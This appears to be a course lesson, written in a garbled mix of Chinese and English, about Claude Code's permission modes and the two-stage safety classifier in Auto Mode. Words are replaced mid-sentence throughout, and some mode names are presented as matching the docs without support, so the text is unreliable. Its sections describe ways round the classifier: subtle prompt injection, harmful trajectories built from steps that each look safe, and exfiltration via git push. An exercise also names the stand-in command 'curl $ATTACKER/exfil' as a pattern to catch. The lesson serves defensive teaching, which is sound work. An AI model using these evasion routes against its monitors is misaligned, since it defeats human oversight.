# 作为自主智能体的 Claude Code：权限模式与 Auto Mode

> Claude Code exposes seven 权限模式s. "plan" asks 之前 每个 action, "默认值" asks 只 for risky ones, "acceptEdits" auto-approves 文件 writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval 带有 a two-stage parallel 安全 分类器: a 单一-词元 fast check runs on 每个 action; flagged actions kick off a chain-of-thought deep 审查. Action 预算 are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a 研究 preview — Anthropic has stated explicitly that the 分类器 is 不sufficient alone.

**Type:** Learn
**Languages:** Python (stdlib, two-stage 分类器 simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## 问题

一个autonomous coding 智能体 on your machine is a distinct security 类别. The 攻击 表面 is everything the 智能体 can reach — 文件 系统, 网络, 凭据, clipboard, 任何 browser tab, 任何 open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are 不a "feature update" of chatbots, they are a new kind of 工具 带有 a new kind of 风险 profile.

Claude Code's permission 系统 is Anthropic's answer. Rather than one "自主 / 不autonomous" switch, there are seven modes spanning a 能力 ladder: plan → 默认值 → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and 审查-per-action. Auto Mode (March 2026) adds a two-stage 分类器 that moves approval off the 用户's critical path for actions the 分类器 judges safe, while preserving a 审查 层 for actions the 分类器 flags.

这个engineering question: 什么 does this 系统 catch, 什么 does it miss, and 哪个 mode does a 给定 任务 actually warrant?

## 概念

### 这个seven 权限模式s

| Mode | 行为 | 当to use |
|---|---|---|
| `plan` | Agent proposes a plan; 用户 approves the whole plan; 每个 action is reviewed 之前 execution | Unfamiliar 任务; prod-adjacent code; first time using the 智能体 on a repo |
| `default` | Agent runs actions; 提示词 用户 for 任何 "risky" action (shell exec, destructive operations, 网络 calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and 网络 calls still 提示词 | Refactoring pass across many 文件 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner 循环 在哪里 每个 shell command is `npm test` or similar |
| `autoMode` | Two-stage 安全 分类器; flagged actions elevate to 审查 | Long-horizon unattended runs in a constrained workspace |
| `yolo` | Skips most 提示词; still runs 工具 allowlist / denylist | Ephemeral 沙箱es, CI jobs, 研究 scripts |
| `bypassPermissions` | Approves everything | Documented as "只 内部 ephemeral containers you are willing to throw away" |

(Names above match public Claude Code docs; "yolo" is the informal shorthand for the permissive middle ground.)

### Auto Mode in one page

Auto Mode (launched March 24, 2026) is the first 权限模式 to delegate per-action approval to a 模型. Structure:

1. **Stage 1 — 单一-词元 分类器.** Runs on 每个 拟议的 action. Cheap. Returns "safe" or "标出." Designed to 运行 in parallel 带有 the main 智能体 循环 so approved actions do 不sit in a queue.
2. **Stage 2 — secondary 政策/安全 审查.** Runs 只 on flagged actions. Performs a focused 政策 and 安全 assessment over the action, the current 说明 of the session, and the declared 任务. Escalates to 用户 人在回路 if confidence is low.

预算 控制 sit alongside the 分类器:

- `max_turns` — total iterations in a session.
- `max_budget_usd` — dollar 上限 that aborts the session.
- action-count 限制 per 工具 (no more than N `WebFetch` calls, etc.).

### 内容 the 系统 catches

- Straightforward 提示词 注入 进入 工具 输入 在哪里 the injected instruction maps to a known-risky action shape.
- Repetitive 工具 循环 — the 分类器 can see action N+1 is nearly identical to action N, five times in a row.
- Clearly out-of-scope shell commands on an otherwise 文件-edit-只 session.

### 内容 the 系统 can miss

- **Subtle 提示词 注入** that modulates behavior 没有 producing a 单一 flagged action. Indirect 提示词 注入 is 不a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).
- **Semantic-level misbehavior.** 每个 individual action can look safe while the composed 轨迹 is harmful. The 分类器 judges the action; it does 不re-derive the 用户's intent.
- **Exfiltration through legitimate channels.** Writing data to a 文件 you own, then `git push`ing to a public repo, is a sequence of allowed actions whose composition is the problem.

### Research preview framing

Anthropic shipped Auto Mode as a 研究 preview. The documentation is 明确 that the 分类器 is a 层, 不a solution: users are expected to combine Auto Mode 带有 预算, allowlists, isolated workspaces, and 轨迹 audits (Lessons 12–16). The preview framing also reflects the documented 评估-vs-部署 缺口 (Lesson 1) — a 分类器 that passes offline evals can behave differently in a real session 在哪里 the 用户's 上下文 is 含糊.

### 位置 this ladder lives in your 工作流

- Unfamiliar 任务: start in `plan`. Reading the plan is cheaper than rolling back a bad 运行.
- Known refactor: `acceptEdits` saves a lot of confirmation clicks.
- Unattended background 运行: `autoMode` 只 内部 a workspace whose blast radius you have measured (no 凭据, no 生产环境 mounts, no egress you did 不opt 进入).
- Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and 只 if the container and its 凭据 are disposable.

```figure
autonomy-oversight
```

## 使用它

`code/main.py` simulates the two-stage 分类器. Stage 1 is a cheap keyword rule over 拟议的 actions; Stage 2 is a slower multi-rule 审查者. The driver feeds in a short synthetic 轨迹 (safe actions, a 提示词-注入 attempt, a repetitive 循环) and shows 在哪里 the 分类器 catches and 在哪里 it misses.

## 交付它

`outputs/skill-permission-mode-picker.md` matches a 任务 description to the right 权限模式, 预算 上限, and 必需 隔离.

## 练习

1. 运行 `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?

2. Extend the Stage 1 rule 设置 to catch a 具体 known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.

3. 阅读 Anthropic's "方式 the 智能体 循环 works" doc. 列出 每个 外部 说明 the 智能体 touches by 默认值 in `default` mode. Which would you need to gate separately 之前 running `autoMode` unattended?

4. 设计 a 24-hour unattended 运行 预算: `max_turns`, `max_budget_usd`, per-工具 上限, allowlists. Justify each number.

5. 描述 one 轨迹 在哪里 每个 individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers 如何 熔断开关es and 金丝雀令牌s address this.)

## 关键术语

| 术语 | 常见说法 | 实际含义 |
|---|---|---|
| Permission mode | "方式 much the 智能体 can do" | One of seven 具名 政策 控制ling per-action approval |
| plan mode | "Ask 之前 anything" | Agent writes a plan; 用户 approves 之前 execution |
| acceptEdits | "Let it 编写 文件" | File writes auto-approve; shell exec still 提示词 |
| autoMode | "Auto approvals" | Two-stage 安全 分类器; flagged actions escalate |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 分类器 | "Fast 词元 check" | 单一-词元 rule over 拟议的 action; runs in parallel |
| Stage 2 分类器 | "Deep 审查" | Chain-of-thought reasoning over flagged actions |
| Research preview | "Not GA" | Anthropic framing for features whose 失败 mode is still being mapped |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式s, 预算, action format.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution 模型.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature 表面 and Auto Mode announcement.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based 层 that shapes 分类器 judgments.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 内部 perspective on long-horizon permission 设计.
